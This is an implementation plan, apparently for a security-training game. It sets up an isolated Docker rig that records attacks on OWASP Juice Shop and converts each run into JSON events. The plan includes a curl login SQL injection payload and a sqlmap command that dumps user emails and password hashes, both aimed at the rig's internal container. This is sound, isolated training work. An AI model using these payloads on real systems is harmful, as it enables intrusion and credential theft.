# Recording rig and first two recordings Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** A re-runnable, isolated Docker rig that records Death's moves against Juice Shop (REC-01), a capture + converter that turns one run into one JSON events file (REC-02), and the first two recordings: ATK-03.a (login SQLi) and ATK-08.a (sqlmap UNION dump).

**Architecture:** `recording/` at the repo root holds the rig (compose, nginx, tools image, attack scripts, a bash driver that writes raw runs to the gitignored `recording/runs/`). The converter's logic is typed, tested TypeScript in `game/src/recordings/`; a thin CLI in `game/scripts/` turns a raw run into `game/src/recordings/<move>.<variant>.json`. CI never runs Docker: it validates the committed JSON and runs converter unit tests on small fixtures.

**Tech Stack:** Docker Compose, nginx 1.29-alpine, `bkimminich/juice-shop:v20.4.0`, a Python-alpine tools image with curl + sqlmap (pinned), Node ≥ 22 (type stripping), sql.js, Vitest.

**Spec:** `docs/PRD.md` §3 (ATK-03, ATK-08, ⚠ facts), §9 (REC-01, REC-02); `docs/KNOWN_ISSUES.md` KI-03; `AGENTS.md`.

## Global Constraints

- Attacks only ever run against our own isolated container, only while recording. The rig network is `internal: true` (no route out, no published ports); `record.sh` aborts if the isolation check fails.
- Attacker IPs in committed recordings are rewritten into `203.0.113.0/24` (TEST-NET-3). No Docker-internal address (`10.66.0.0/24`) may appear in any committed file under `game/src/recordings/`.
- Juice Shop is pinned to `bkimminich/juice-shop:v20.4.0` (not `latest`, which is a 20.4.0-SNAPSHOT build).
- One JSON file per move variant in `game/src/recordings/` (REC-02). Format = decision D-15, written and committed **before** the converter.
- `npm run health` in `game/` green after every task. Fresh code only (nothing from `../reanimator` / `../poltergeist-old`).
- D/KI numbers: re-check `origin/main` before committing docs (parallel sessions). Expected next free: D-15.
- No Kiro session in this work (KDEV-05 is not claimed by these scripts; say so in the PR).

## Review Focus

1. **An internal IP leaks** through a field the rewrite didn't touch (app-log text, referer, sqlmap traffic) → recordings test greps every committed JSON for `10.66.` and asserts every `access.ip` is in `203.0.113.0/24` (Task 5).
2. **Rig not actually isolated** (network accidentally non-internal) → `check-isolation.sh` must fail closed and `record.sh` refuses to attack (Task 1).
3. **sqlmap traffic and the access log disagree in count** (retries, keep-alive oddities) → exfil attribution would be shifted; the converter throws instead of guessing (Task 4 test).
4. **Odd characters in logged fields** (quotes/backslashes in a user agent or `q=` payload) → nginx `escape=json` line still parses; fixture with a quote in the UA (Task 4 test).
5. **Large or binary uploaded files** (later ATK-13/17) → `contentBase64` only for files ≤ 64 KiB, otherwise omitted with size + sha256 kept (Task 4 test).

---

### Task 1: The rig (REC-01)

**Files:**
- Create: `recording/compose.yaml`, `recording/nginx/nginx.conf`, `recording/tools/Dockerfile`, `recording/check-isolation.sh`, `recording/README.md`
- Modify: `.gitignore` (add `recording/runs/`), `AGENTS.md` (repo tree gets `recording/`)

**Interfaces:**
- Produces: compose project `rec`, network `rec` = `10.66.0.0/24`, `internal: true`. Services: `juice` (`10.66.0.20`, port 3000, healthcheck via `/nodejs/bin/node -e fetch(...)` since the image is distroless), `nginx` (`10.66.0.10`, port 80, `proxy_pass http://10.66.0.20:3000`, sets `X-Forwarded-For`), `tools` (`10.66.0.66`, compose profile `attack`, mounts `./attacks:/attacks:ro` and `./runs/.out:/out`). nginx bind-mounts `./runs/.nginx:/var/log/rec` and writes two logs there: `access.log` (`combined`) and `access.jsonl`:
  ```
  log_format rec escape=json '{"msec":"$msec","ip":"$remote_addr","method":"$request_method","target":"$request_uri","protocol":"$server_protocol","status":$status,"bytes":$body_bytes_sent,"referer":"$http_referer","ua":"$http_user_agent","rt":"$request_time"}';
  ```
- Tools image: `python:3.13-alpine` + `curl` + `pip install sqlmap==<latest 1.9.x, pinned>`.

- [ ] **Step 1:** Write `check-isolation.sh`: inside `tools` (via `docker compose --profile attack run --rm tools`) assert `curl -m 5 http://10.66.0.10/rest/admin/application-version` returns 200 **and** `curl -m 5 https://example.com` and `curl -m 5 http://1.1.1.1` both fail; also `docker network inspect rec_rec` reports `"Internal": true`. Exit non-zero on any mismatch.
- [ ] **Step 2:** Run it with the stack down → expected FAIL.
- [ ] **Step 3:** Write compose, nginx.conf, tools Dockerfile; `docker compose -p rec up -d --wait juice nginx`.
- [ ] **Step 4:** Run `recording/check-isolation.sh` → expected exit 0, and `runs/.nginx/access.jsonl` has the probe line.
- [ ] **Step 5:** `cd game && npm run health` green; commit `Add the isolated recording rig (REC-01)`.

### Task 2: The capture driver (REC-02, raw half) and the attack scripts

**Files:**
- Create: `recording/record.sh`, `recording/attacks/ATK-03.a.sh`, `recording/attacks/ATK-08.a.sh`

**Interfaces:**
- Consumes: Task 1's stack.
- Produces: `recording/record.sh <MOVE> <VARIANT> <PUBLIC_IP>` → `recording/runs/<MOVE>.<VARIANT>/` containing
  `run.json` `{ move, variant, publicIp, attackerIp: "10.66.0.66", image, tool, startedAtMs, endedAtMs }`,
  `before.sqlite`, `after.sqlite` (`docker cp rec-juice-1:/juice-shop/data/juiceshop.sqlite`),
  `uploads-before/`, `uploads-after/` (`docker cp …:/juice-shop/uploads`),
  `access.log`, `access.jsonl` (from `runs/.nginx`), `app.log` (`docker logs --timestamps rec-juice-1`),
  plus whatever the attack writes to `/out` (sqlmap: `traffic.txt` from `-t /out/traffic.txt`).
- Order: `down -v` → `up -d --wait` → check-isolation (abort on fail) → truncate nginx logs → snapshot before → `startedAtMs` → `compose run --rm tools /attacks/<MOVE>.<VARIANT>.sh` → `endedAtMs` → sleep 2 → snapshot after + logs.
- `ATK-03.a.sh`: one `curl -s -X POST http://10.66.0.10/rest/user/login -H 'Content-Type: application/json' -d '{"email":"'"'"' OR 1=1--","password":"x"}'`, default curl UA (the loud variant). Prints the response.
- `ATK-08.a.sh`: `sqlmap -u 'http://10.66.0.10/rest/products/search?q=apple' -p q --dbms=sqlite --technique=U --batch -T Users -C email,password --dump -t /out/traffic.txt --output-dir=/out/sqlmap`, default sqlmap UA. If sqlmap can't find the injection unaided, add `--prefix="'))" --suffix="--"` and/or `--level`; the script records the final working flags.

- [ ] **Step 1:** `record.sh ATK-03 a 203.0.113.23` → expect a run dir; `access.jsonl` has exactly one POST `/rest/user/login` with status 200; the attack's stdout contains `"authentication"` with a token for `admin@juice-sh.op`.
- [ ] **Step 2:** `record.sh ATK-08 a 203.0.113.81` → expect sqlmap's dump CSV to list the Users emails + hashes; `access.jsonl` has hundreds of `/rest/products/search` lines with UA `sqlmap/…`; `traffic.txt` exists.
- [ ] **Step 3:** Re-run both once more to prove they're re-runnable from scratch (same outcome).
- [ ] **Step 4:** Commit `Add the capture driver and the ATK-03.a / ATK-08.a scripts (REC-02)`.

### Task 3: Decision D-15, the recording format (before the converter)

**Files:**
- Modify: `docs/DECISIONS.md` (row + `### D-15` section), `docs/PRD.md` REC-02 spec cell (point at D-15)
- Create: `game/src/recordings/format.ts`, `game/src/recordings/format.test.ts`

**The format (to be written into D-15):** one file `game/src/recordings/<MOVE>.<variant>.json`, e.g. `ATK-03.a.json`:

```ts
interface Recording {
  format: 1;
  move: string;           // 'ATK-03'
  variant: string;        // 'a'
  label: string;          // 'loud: curl user agent, one request'
  recordedAt: string;     // ISO time the run started
  durationMs: number;
  attackerIp: string;     // in 203.0.113.0/24
  juiceShop: string;      // 'bkimminich/juice-shop:v20.4.0'
  tool: string;           // 'curl 8.x' | 'sqlmap 1.9.x'
  events: RecEvent[];     // sorted by t, t = ms since run start, 0 ≤ t ≤ durationMs
}
type RecEvent =
  | { t: number; kind: 'access'; ip: string; method: string; target: string; protocol: string;
      status: number; bytes: number; referer: string; userAgent: string; requestTimeMs: number }
  | { t: number; kind: 'app'; text: string }
  | { t: number; kind: 'db'; op: 'insert' | 'update' | 'delete'; table: string;
      key: Record<string, string | number>; before?: Row; after?: Row }
  | { t: number; kind: 'file'; op: 'add' | 'change' | 'remove'; path: string;
      size: number; sha256: string; contentBase64?: string }
  | { t: number; kind: 'exfil'; table: string; keys: number[]; columns: string[] };
type Row = Record<string, string | number | null>;
```

Rules the decision states: access events store fields, not the rendered line (the replay engine stamps game time and renders `combined`); `app` lines are verbatim minus Juice Shop's "solved challenge" lines (scoreboard noise a real shop wouldn't log), keeping only lines inside the run window; `db` and `file` events come from before/after snapshots, so they're stamped at the run's last access event (the snapshots only bracket the run); `key` is `id` when the table has one, else `rowid`; `exfil` events come from matching sqlmap's traffic responses to the access log in order and record which rows' columns appeared in that response; `contentBase64` only for files ≤ 64 KiB; the attacker's internal IP is replaced everywhere (every string field) by `attackerIp`. The baseline DB the game boots from is `game/src/recordings/juiceshop.sqlite` (ATK-03.a's `before.sqlite`); every recording's `db`/`exfil` events apply on top of it.

**Interfaces:**
- Produces: `format.ts` exports the types above plus `validateRecording(x: unknown): string[]` (empty array = valid; each string names the path, e.g. `events[3].t: out of range`) and `isTestNet3(ip: string): boolean`.

- [ ] **Step 1:** Commit the D-15 docs change on its own: `Record decision D-15: the recording format`.
- [ ] **Step 2:** Write `format.test.ts`: a hand-written minimal valid recording → `[]`; unsorted events → error naming `events[1].t`; `attackerIp: '10.66.0.66'` → error; access `ip` outside TEST-NET-3 → error; `t > durationMs` → error; unknown `kind` → error; `isTestNet3('203.0.113.255') === true`, `isTestNet3('203.0.114.1') === false`.
- [ ] **Step 3:** `npx vitest run src/recordings/format.test.ts` → FAIL (module missing).
- [ ] **Step 4:** Implement `format.ts`.
- [ ] **Step 5:** Test → PASS; `npm run health` green; commit `Add the recording format types and validator (D-15)`.

### Task 4: The converter

**Files:**
- Create: `game/src/recordings/convert.ts`, `game/src/recordings/convert.test.ts`, `game/src/recordings/__fixtures__/` (tiny hand-made inputs), `game/scripts/convert-recording.ts`
- Modify: `game/package.json` (`sql.js` dependency, `@types/sql.js` dev; `"recording:convert": "node scripts/convert-recording.ts"`), `game/tsconfig.node.json` (include `scripts`, `allowImportingTsExtensions: true`; base already `noEmit` — verify)

**Interfaces:**
- Consumes: `Recording`, `RecEvent`, `validateRecording` from Task 3.
- Produces (pure, in `convert.ts`):
  - `parseAccessJsonl(text: string, startMs: number): AccessEvent[]` (t = `round(msec*1000) - startMs`, `requestTimeMs = round(rt*1000)`)
  - `parseAppLog(text: string, startMs: number, endMs: number): AppEvent[]` (docker `--timestamps` prefix; drops out-of-window and solved-challenge lines)
  - `diffDatabases(before: Database, after: Database, t: number): DbEvent[]` (sql.js `Database`; all tables from `sqlite_master`)
  - `diffUploads(before: Map<string, Buffer>, after: Map<string, Buffer>, t: number): FileEvent[]`
  - `exfilFromTraffic(traffic: string, access: AccessEvent[], users: { id: number; email: string; password: string }[]): ExfilEvent[]` — throws `traffic has N requests, access log has M` on mismatch
  - `rewriteIp<T>(value: T, from: string, to: string): T` (deep, every string)
  - `buildRecording(meta, events): Recording` (sorts, rewrites, validates; throws with the validator's errors)
- CLI: `npm run recording:convert -- ../recording/runs/ATK-03.a` reads the run dir, writes `src/recordings/ATK-03.a.json`; with `--baseline` also copies `before.sqlite` to `src/recordings/juiceshop.sqlite`.

- [ ] **Step 1:** Write `convert.test.ts` against fixtures: access line with `"` and `\` in UA parses and keeps them; app log drops a `Solved 1-star loginAdminChallenge` line and a line before `startMs`; two in-memory sql.js DBs (Users with an updated `role`, one inserted row) → one `update` with `before`/`after`, one `insert`; uploads: added file ≤ 64 KiB carries `contentBase64`, a 70 KiB one doesn't; traffic fixture with 2 requests vs 3 access lines → throws the mismatch message; traffic whose 2nd response body contains `admin@juice-sh.op` and its hash → one exfil `{ keys: [1], columns: ['email','password'] }` at the 2nd access line's t; `rewriteIp` replaces inside nested strings (`'from 10.66.0.66:5000'`).
- [ ] **Step 2:** Run → FAIL. **Step 3:** Implement. **Step 4:** Run → PASS.
- [ ] **Step 5:** `npm run health` green; commit `Add the recording converter (REC-02)`.

### Task 5: Convert and commit the two recordings; the sql.js check

**Files:**
- Create: `game/src/recordings/ATK-03.a.json`, `game/src/recordings/ATK-08.a.json`, `game/src/recordings/juiceshop.sqlite`, `game/src/recordings/recordings.test.ts`

- [ ] **Step 1:** Write `recordings.test.ts`: every `*.json` in the folder passes `validateRecording`; no file's raw text contains `10.66.`; ATK-03.a has exactly one access event `POST /rest/user/login` status 200 and no failed login before it; ATK-08.a has ≥ 100 access events whose `userAgent` starts with `sqlmap` and ≥ 1 exfil event on `Users` with `email` and `password`; **sql.js opens `juiceshop.sqlite`** and `SELECT count(*) FROM Users` > 0 and `SELECT email FROM Users WHERE role='admin'` includes `admin@juice-sh.op`; `PRAGMA table_info(Users)` result is recorded (asserting `isActive` present or absent per what Task 6 found).
- [ ] **Step 2:** Run → FAIL (no files). **Step 3:** `npm run recording:convert -- ../recording/runs/ATK-03.a --baseline`, then `… ATK-08.a`. Check sizes (`juiceshop.sqlite` should be ≲ 5 MB; if bigger, stop and ask).
- [ ] **Step 4:** Run → PASS; `npm run health` green; commit `Add the ATK-03.a and ATK-08.a recordings and the baseline DB`.

### Task 6: KI-03, PRD corrections, docs, PR

**Files:**
- Modify: `docs/KNOWN_ISSUES.md`, `docs/PRD.md` (only rows a confirmed fact contradicts), `docs/DECISIONS.md` (one entry per PRD row changed), `recording/README.md`

- [ ] **Step 1:** Confirm the ⚠ facts **by reading Juice Shop v20.4.0's source inside the image** (no attack run): `routes/resetPassword.ts` (security-question reset), `routes/changePassword.ts` (current password optional?), `routes/fileUpload.ts` (type check bypass), `lib/insecurity.ts` + JWT verify (`alg: none`), `server.ts` routes for `PUT /api/Products/:id` + sanitization (stored XSS via API), `models/user.ts` (`isActive` column; also checked live via `PRAGMA table_info`). Plus the non-⚠ claims the two recordings test: ATK-03 "the app log shows the odd email", ATK-08 "huge response sizes".
- [ ] **Step 2:** Rewrite KI-03's text: one line per fact, each `confirmed (recording)`, `confirmed (source)`, `disproved (…)` or `still open`. KI-03 stays Open while any is `source`-only or open.
- [ ] **Step 3:** For each disproved fact: edit its PRD row and add a DECISIONS entry (D-16…) saying what changed and why.
- [ ] **Step 4:** (user, 2026-11-17) No KI. Add **§16 Status** to `docs/PRD.md`: a table `| ID | Status | PR / note |` listing only rows that have left `planned` (absent = `planned`); point §0's Status bullet and "Update the status" sentence at §16; add a DECISIONS entry for it; put this PR's rows in it (REC-01, REC-02 `done`; ATK-03, ATK-08 `building`, recorded but not playable; REC-03 `building`, one variant each so far).
- [ ] **Step 5:** `npm run health` green; `node scripts/check-env-files.mjs` passes; commit; push; `gh pr create` with summary, the isolation check output, and the KI-03 table.
